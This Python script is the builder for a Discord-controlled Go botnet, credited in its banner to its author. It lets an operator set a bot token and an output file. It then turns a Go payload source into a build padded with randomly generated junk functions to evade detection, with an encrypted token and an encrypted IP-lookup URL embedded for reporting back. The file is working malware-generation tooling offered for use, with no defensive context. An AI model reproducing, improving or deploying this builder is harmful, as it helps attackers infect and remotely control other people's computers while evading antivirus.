from colorama import *
from datetime import datetime
from hashlib import md5
from random import randint, choice
import string
import os
import platform

os.environ['coolarrow'] = "—»"
os.environ['dstoken'] = "no"
os.environ['outputfile'] = "no"

commands = [
    ["help", "shows this list"],
    ["quit", "quits avatarbotnet"],
    ["tk", "sets discord token for the bot"],
    ["out", "sets output file for the build"],
    ["opt", "sees building options"],
    ["run", "launch the building process"]
]

def clear():
    if "windows" in platform.platform():
        os.system("cls")
    else:
        os.system("clear")

init(autoreset=True)

def log(text):
    date = str(datetime.now().hour)+":"+str(datetime.now().minute)+":"+str(datetime.now().second)
    print(f"{Fore.RED}{Style.BRIGHT}[log {date}] {text}")

def processcommand(cmd):
    if cmd == "help":
        r = "Commands:"
        for c in commands:
            r += f"\n{c[0]} {os.getenv('coolarrow')} {c[1]}"
        return r
    if cmd == "quit":
        log("Exiting..")
        exit()
    if cmd == "tk":
        log(f"Current token: {os.getenv('dstoken')}")
        os.environ['dstoken'] = input("New token: ")
        return "noreturn"
    if cmd == "gobuild":
        log(f"Current options: {os.getenv('buildoptions')}")
        os.environ['buildoptions'] = input("New build options: ")
        return "noreturn"
    if cmd == "out":
        log(f"Current output file: {os.getenv('outputfile')}")
        os.environ['outputfile'] = input("New output file: ")
        return "noreturn"
    if cmd == "opt":
        return f"""
Building options:
Token {os.getenv('coolarrow')} {os.getenv('dstoken')}
Outfile {os.getenv('coolarrow')} {os.getenv('outputfile')}
        """
    if cmd == "run":
        if os.getenv('outputfile') == "no" or os.getenv('dstoken') == "no":
            return "You haven't set all the options yet."
        log("Accessing main.go source code...")
        if os.path.exists("../src/main.go") == False:
            return "Source file doesen't exist."
        log("Generating and obfuscating file..")
        outfile = os.getenv('outputfile')
        tk = os.getenv('dstoken')
        ff = open(outfile, "a")
        def get_random_string(length):
            letters = string.ascii_lowercase
            result_str = ''.join(choice(letters) for i in range(length))
            return result_str
        f = open("../src/main.go", "r")
        content = f.read()
        content_before_junkcode = content.split("// junk code here")[0]
        content_after_junkcode = content.split("// junk code here")[1]
        f.close()
        def gen_random_code():
            r = randint(1,3)
            if r == 1:
                code = f"fmt.Println(\"{get_random_string(randint(1,20))}\")"
            elif r == 2:
                code = f"log.Print(\"{get_random_string(randint(1,20))}\")"
            else:
                varname = get_random_string(randint(20,40))
                code = f"{varname} := \"{get_random_string(randint(1,20))}\"\n_ = {varname}"
            return code
        ff.write(content_before_junkcode+"\n")
        funclist = []
        for x in range(randint(1,200)):
            code = gen_random_code()
            for x in range(randint(1,200)):
                r = randint(1,7)
                if r == 7:
                    break
                else:
                    code += "\n"+gen_random_code()
            funcname = get_random_string(randint(20,50))
            ff.write(f"//\nfunc {funcname}(){{\n{code}\n}}\n")
            funclist.append(funcname)
        functioncalls = ""
        for l in funclist:
            functioncalls += (f"{l}()\n")
        ipkey = get_random_string(16)
        ipencr = str(os.popen(f"go run encr.go https://checkip.amazonaws.com/ {ipkey}").read()).strip()
        ff.write(content_after_junkcode.replace("func main() {", f"func main() {{\n{functioncalls}").replace('ip := d("getip_obf", "getip_key")', f'ip := d("{ipencr}", "{ipkey}")')+"\n")
        ff.close()
        f = open(outfile, "r")
        content = f.read()
        f.close()
        tk_key = get_random_string(16)
        tk_obf = str(os.popen(f"go run encr.go {os.getenv('dstoken')} {tk_key}").read()).strip()
        f = open(outfile, "w")
        f.write(content.replace("token_obf", tk_obf).replace("token_key", tk_key))
        f.close()
        filehash = md5(open(outfile,'rb').read()).hexdigest()
        return f"building process was successful with md5 hash: '{filehash}'"

def start():
    clear()
    print(f"""{Fore.RED}{Style.BRIGHT}
     e                            d8                    888~~\             d8                        d8   
    d8b     Y88b    /   /~~~8e  _d88__   /~~~8e  888-~\ 888   |  e88~-_  _d88__ 888-~88e  e88~~8e  _d88__ 
   /Y88b     Y88b  /        88b  888         88b 888    888 _/  d888   i  888   888  888 d888  88b  888   
  /  Y88b     Y88b/    e88~-888  888    e88~-888 888    888  \  8888   |  888   888  888 8888__888  888   
 /____Y88b     Y8/    C888  888  888   C888  888 888    888   | Y888   '  888   888  888 Y888    ,  888   
/      Y88b     Y      "88_-888  "88_/  "88_-888 888    888__/   "88_-~   "88_/ 888  888  "88___/   "88_/ 
{Style.DIM}\x1b[3mdiscord golang botnet made by @kl3sshydra\x1b[0m
    """)

    while True:
        date = str(datetime.now().hour)+":"+str(datetime.now().minute)+":"+str(datetime.now().second)
        prompt = input(f"{Fore.RED}{Style.BRIGHT}{date} #{Fore.RESET}{Style.RESET_ALL} ")
        print(f"{Fore.RED}{Style.BRIGHT}{date} running '{prompt}':{Fore.RESET}{Style.BRIGHT}")
        try:
            commandresult = processcommand(prompt).strip()
        except AttributeError:
            commandresult = "Invalid command."
        if commandresult != "noreturn":
            print(f"\n{commandresult}")
        input(f"{Fore.RED}\n...{Style.BRIGHT}")
        start()

start()